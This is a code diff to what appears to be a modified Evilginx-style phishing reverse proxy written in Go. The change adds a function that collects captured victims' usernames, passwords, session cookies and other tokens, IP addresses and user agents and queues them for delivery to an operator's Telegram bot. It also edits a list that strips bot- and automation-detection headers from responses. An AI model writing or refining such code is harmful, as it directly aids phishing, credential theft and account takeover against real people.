@@ -768,9 +768,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									req.ContentLength = int64(len(body))
 									log.Debug("force_post: body: %s len:%d", body, len(body))
 								}
-							}
+							} // <-- THIS brace was missing! It closes the forcePost for loop
 							if trigger == 1 {
-								readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
+								go p.sendTelegramNotificationForSession(ps.SessionId)
 							}
 
 						} else if form_re.MatchString(contentType) {
@@ -867,16 +867,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											body = []byte(req.PostForm.Encode())
 											req.ContentLength = int64(len(body))
 											log.Debug("force_post: body: %s len:%d", body, len(body))
-										}
-									}
-								}
+										} // closes if ok_search
+									} // closes if fp.path.MatchString
+								} // closes for _, fp
 
-							}
+							} // closes if req.ParseForm()
 							if trigger == 1 {
-								readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
+								go p.sendTelegramNotificationForSession(ps.SessionId)
 							}
 
-						}
+						} // closes else if form_re
 						req.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
@@ -933,22 +933,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			trigger := 0
 
-/*			var rm_headers = []string{
-				"X-Permitted-Cross-Domain-Policies",
-				"X-Evilginx",
-				"Cross-Origin-Opener-Policy",
-				"Cross-Origin-Embedder-Policy",
-				"Cross-Origin-Resource-Policy",
-				"X-Apple-Auth-Attributes",
-				"X-Content-Security-Policy",
-				"X-Cache-Status",
-				"X-Cache",
-				"X-Permitted-Cross-Domain-Policies",
-				"X-Client-Data",
+/*			// Remove potentially problematic response headers
+			var rm_headers = []string{
+				"X-Powered-By",
+				"Server",
 				"Via",
-				"Forwarded",
-				"Public-Key-Pins",
+				"X-Cache",
+				"X-Cache-Status",
 				"X-Forwarded-Host",
+				"Public-Key-Pins",
 				"Public-Key-Pins-Report-Only",
 				"X-Selenium",
 				"X-WebDriver",
@@ -957,7 +950,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				"X-Automation",
 				"X-Bot",
 				"X-Crawler",
-				"X-Spider"
+				"X-Spider",
 			}
 			for _, hdr := range rm_headers {
 				resp.Header.Del(hdr)
@@ -1290,7 +1283,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			if trigger == 1 {
-				readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
+    			go p.sendTelegramNotificationForSession(ps.SessionId)
 			}
 
 			return resp
@@ -1367,21 +1360,7 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 	return req, nil
 }
 
-func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
-	js := fmt.Sprintf("top.location.href=%s;", strconv.Quote(rurl))
-	encodedJs := base64.StdEncoding.EncodeToString([]byte(js))
-	body := fmt.Sprintf("<html><head><script>eval(atob('%s'));</script></head><body></body></html>", encodedJs)
-	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
-	if resp != nil {
-		return req, resp
-	}
-                resp.Header.Set("Referrer-Policy", "no-referrer")
-                resp.Header.Set("Cache-Control", "no-store")
-                resp.Header.Set("X-Content-Type-Options", "nosniff")
-                resp.Header.Set("X-Frame-Options", "DENY")
-                resp.Header.Set("Content-Security-Policy", "default-src none; script-src unsafe-eval self")
-	return req, nil
-}
+
 
 func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
 	js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
@@ -2028,6 +2007,87 @@ func (p *HttpProxy) getSessionIdByIP(ip_addr string, hostname string) (string, b
 		return sid, ok
 	}
 	return "", false
+}
+
+// sendTelegramNotificationForSession sends a Telegram notification for a captured session.
+// This runs in a goroutine so it does not block the HTTP proxy.
+func (p *HttpProxy) sendTelegramNotificationForSession(sessionID string) {
+    if sessionID == "" {
+        return
+    }
+    
+    chatid := p.cfg.general.Chatid
+    teletoken := p.cfg.general.Teletoken
+    
+    if chatid == "" || teletoken == "" {
+        log.Debug("telegram: notification skipped - chatid or teletoken not configured")
+        return
+    }
+
+    // Get session from memory (much faster than reading the database file)
+    p.session_mtx.Lock()
+    s, exists := p.sessions[sessionID]
+    p.session_mtx.Unlock()
+    
+    if !exists {
+        log.Debug("telegram: session %s not found in memory, falling back to database", sessionID)
+        // Fallback: use the database read method
+        readFile(chatid, teletoken)
+        return
+    }
+
+    // Build TSession from in-memory session
+    tsession := TSession{
+        Username:   s.Username,
+        Password:   s.Password,
+        LandingURL: s.RedirectURL,
+        UserAgent:  s.UserAgent,
+        RemoteAddr: s.RemoteAddr,
+        Tokens:     make(map[string]interface{}),
+        BodyTokens: make(map[string]interface{}),
+        HTTPTokens: make(map[string]interface{}),
+        Custom:     make(map[string]interface{}),
+    }
+    
+    // Copy custom params
+    for k, v := range s.Custom {
+        tsession.Custom[k] = v
+    }
+    // Copy body tokens
+    for k, v := range s.BodyTokens {
+        tsession.BodyTokens[k] = v
+    }
+    // Copy HTTP tokens
+    for k, v := range s.HttpTokens {
+        tsession.HTTPTokens[k] = v
+    }
+    // Copy cookie tokens as JSON
+    if len(s.CookieTokens) > 0 {
+        tokenJSON, _ := json.Marshal(s.CookieTokens)
+        var tokenMap map[string]interface{}
+        json.Unmarshal(tokenJSON, &tokenMap)
+        tsession.Tokens = tokenMap
+    }
+    
+    // Get session info from database for timestamps, etc.
+    sessions, err := p.db.ListSessions()
+    if err == nil {
+        for _, dbSession := range sessions {
+            if dbSession.Sid == sessionID {
+                tsession.ID = dbSession.Id
+                tsession.Phishlet = dbSession.Phishlet
+                tsession.CreateTime = dbSession.CreateTime
+                tsession.UpdateTime = dbSession.UpdateTime
+                if tsession.LandingURL == "" {
+                    tsession.LandingURL = dbSession.LandingURL
+                }
+                break
+            }
+        }
+    }
+
+    log.Debug("telegram: sending notification for session %s (username: %s)", sessionID, tsession.Username)
+    GetTelegramQueue().Enqueue(tsession, chatid, teletoken)
 }
 
 func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
